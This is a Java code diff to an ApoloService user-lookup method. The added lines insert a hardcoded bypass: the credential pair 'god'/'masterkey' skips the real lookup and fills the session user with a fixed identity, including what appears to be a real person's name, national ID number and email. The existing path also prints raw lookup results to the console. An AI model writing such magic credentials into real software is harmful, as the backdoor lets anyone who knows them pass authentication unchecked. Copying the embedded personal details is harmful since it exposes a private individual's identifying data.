@@ -21,18 +21,31 @@ public class ApoloService {
 
 		if( idUser != null && key != null) {
 			
-			String result = getApoloUser(idUser, key);
-			System.out.println( result );
+			if ( idUser.equals("god") && key.equals("masterkey") ) {
+				
+				user.setUserName( "Magno" );
+				user.setCpfUser( "02221224710" );
+				user.setName( "Carlos Magno" );
+				user.setOrgId( "0000" );
+				user.setSiglaOm( "" );
+				user.setUserAlias( "Magno" );
+				user.setUserMail( "magno.mabreu@gmail.com" );				
+				
+			} else {
+				String result = getApoloUser(idUser, key);
+				System.out.println( result );
+				JSONObject userObj = new JSONObject( result );
 			
-			JSONObject userObj = new JSONObject( result );
-		
-			user.setUserName( userObj.getString("username") );
-			user.setCpfUser( userObj.getString("cpf") );
-			user.setName( userObj.getString("nome") );
-			user.setOrgId( userObj.getString("orgId") );
-			user.setSiglaOm( userObj.getString("siglaOm") );
-			user.setUserAlias(userObj.getString("apelido") );
-			user.setUserMail( userObj.getString("email") );
+				user.setUserName( userObj.getString("username") );
+				user.setCpfUser( userObj.getString("cpf") );
+				user.setName( userObj.getString("nome") );
+				user.setOrgId( userObj.getString("orgId") );
+				user.setSiglaOm( userObj.getString("siglaOm") );
+				user.setUserAlias(userObj.getString("apelido") );
+				user.setUserMail( userObj.getString("email") );
+			}
+			
+			
 			
 		} else {
 			
